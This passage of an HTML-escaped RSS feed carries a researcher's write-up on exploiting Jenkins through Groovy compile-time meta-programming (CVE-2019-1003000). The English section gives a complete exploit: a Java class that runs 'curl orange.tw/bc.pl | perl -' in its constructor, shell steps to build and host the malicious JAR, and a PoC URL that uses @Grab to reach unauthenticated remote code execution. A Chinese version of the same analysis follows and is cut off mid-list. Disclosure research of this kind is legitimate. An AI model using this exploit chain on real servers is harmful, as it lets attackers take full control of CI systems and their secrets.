        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&#39;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JAR file is just a subset of ZIP format. In the &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;, Grape registers servies if there are some specified entry points. Among them, the &lt;code class=&quot;highlighter-rouge&quot;&gt;Runner&lt;/code&gt; interests me. By looking into the implementation of &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(…)&lt;/a&gt;, we found this:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we see the &lt;code class=&quot;highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt;. Does it mean that we can call &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; and we can invoke the &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; and execute arbitrary code!&lt;/p&gt;

&lt;p&gt;Here is the full exploit:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&#39;orange.tw&#39;, root=&#39;http://[your_host]/&#39;)%0a
@Grab(group=&#39;tw.orange&#39;, module=&#39;poc&#39;, version=&#39;1&#39;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Video:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;) on Jenkins to protect the Pipeline, it’s useless because the vulnerability is in compile-time, not in run-time!&lt;/p&gt;

&lt;p&gt;Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points &lt;code class=&quot;highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; I reported, after the vulnerability has been fixed, &lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; also found another &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;entry point&lt;/a&gt; quickly to trigger this vulnerability!&lt;/p&gt;

&lt;p&gt;Apart from that, this vulnerability can also be chained with my previous exploit on &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P&lt;/p&gt;

&lt;p&gt;Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;嗨! 大家今天過得好嗎?&lt;/p&gt;

&lt;p&gt;這篇文章是 Hacking Jenkins 系列的下集! 給那些還沒看過上篇文章的同學，可以訪問下面鏈結，補充一些基本知識及了解之前如何從 Jenkins 中的動態路由機制到串出各種不同的攻擊鏈!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing&lt;br /&gt;
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如上篇文章所說，為了最大程度發揮漏洞的效果，想尋找一個代碼執行的漏洞可以與 ACL 繞過漏洞搭配，成為一個不用認證的遠端代碼執行! 不過在最初的嘗試中失敗了，由於動態路由機制的特性，Jenkins 在遇到一些危險操作時(如 &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)都會再次的檢查權限! 導致就算可以繞過最前面的 ACL 層依然無法做太多事情!&lt;/p&gt;

&lt;p&gt;直到 Jenkins 在 2018-12-05 發佈的 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; 修復了前述我所回報的動態路由漏洞! 為了開始撰寫這份技術文章(Hacking Jenkins 系列文)，我重新複習了一次當初進行代碼審查的筆記，當中對其中一個跳板(gadget)想到了一個不一樣的利用方式，因而有了這篇故事! 這也是近期我所寫過覺得比較有趣的漏洞之一，非常推薦可以仔細閱讀一下!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;要解釋這次的漏洞 &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt; 必須要從 Pipeline 開始講起! 大部分開發者會選擇 Jenkins 作為 CI/CD 伺服器的其中一個原因是因為 Jenkins 提供了一個很強大的 Pipeline 功能，使開發者可以方便的去撰寫一些 Build Script 以完成自動化的編譯、測試及發佈! 你可以想像 Pipeline 就是一個小小的微語言可以去對 Jenkins 進行操作(而實際上 Pipeline 是基於 Groovy 的一個 DSL)&lt;/p&gt;

&lt;p&gt;為了檢查使用者所撰寫的 Pipeline Script 有沒有語法上的錯誤(Syntax Error)，Jenkins 提供了一個介面給使用者檢查自己的 Pipeline! 這裡你可以想像一下，如果你是程式設計師，你要如何去完成這個功能呢? 你可以自己實現一個語法樹(AST, Abstract Syntax Tree)解析器去完成這件事，不過這太累了，最簡單的方式當然是套用現成的東西!&lt;/p&gt;

&lt;p&gt;前面提到，Pipeline 是基於 Groovy 所實現的一個 DSL，所以 Pipeline 必定也遵守著 Groovy 的語法! 所以最簡單的方式是，只要 Groovy 可以成功解析(parse)，那就代表這份 Pipeline 的語法一定是對的! Jenkins 實作檢查的程式碼約是下面這樣子:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這裡使用了 &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(…)&lt;/a&gt; 去完成 Groovy 語法的解析! 值得注意的是，由於這只是一個 AST 的解析，在沒有執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 的方法前，任何危險的操作是不會被執行的，例如嘗試去解析這段 Groovy 代碼會發現其實什麼事都沒發生 :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;從程式開發者的角度來看，Pipeline 可以操作 Jenkins 那一定很危險，因此要用嚴格的權限保護住! 但這只是一段簡單的語法錯誤檢查，而且呼叫到的地方很多，限制太嚴格的權限只會讓自己綁手綁腳的!&lt;/p&gt;

&lt;p&gt;上面的觀點聽起來很合理，就只是一個 AST 的解析而且沒有任何 &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 方法應該很安全，但恰巧這裡就成為了我們第一個入口點! 其實第一次看到這段代碼時，也想不出什麼利用方法就先跳過了，直到要開始撰寫技術文章重新溫習了一次，我想起了說不定 Meta-Programming 會有搞頭!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;什麼是-meta-programming&quot;&gt;什麼是 Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;首先我們來解釋一下什麼是 Meta-Programming!&lt;/p&gt;

&lt;p&gt;Meta-Programming 是一種程式設計的思維! Meta-Programming 的精髓在於提供了一個抽象層次給開發者用另外一種思維去撰寫更高靈活度及更高開發效率的代碼。其實 Meta-Programming 並沒有一個很嚴謹的定義，例如使用程式語言編譯所留下的 Metadata 去動態的產生程式碼，或是把程式自身當成資料，透過編譯器(compiler)或是直譯器(interpreter)去撰寫代碼都可以被說是一種 Meta-Programming! 而其中的哲學其實非常廣泛甚至已經可以被當成程式語言的一個章節來獨立探討!&lt;/p&gt;

&lt;p&gt;大部分的文章或是書籍在解釋 Meta-Programming 的時候通常會這樣解釋:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;用程式碼(code)產生程式碼(code)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;如果還是很難理解，你可以想像程式語言中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; 其實就是一種廣義上的 Meta-Programming! 雖然不甚精確，但用這個比喻可以快速的理解 Meta-Programming! 其實就是用程式碼(eval 這個函數)去產生程式碼(eval 出來的函數)! 在程式開發上，Meta-Programming 也有著極其多的應用，例如:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C 語言中的 Macro&lt;/li&gt;
  &lt;li&gt;C++ 的 Template&lt;/li&gt;
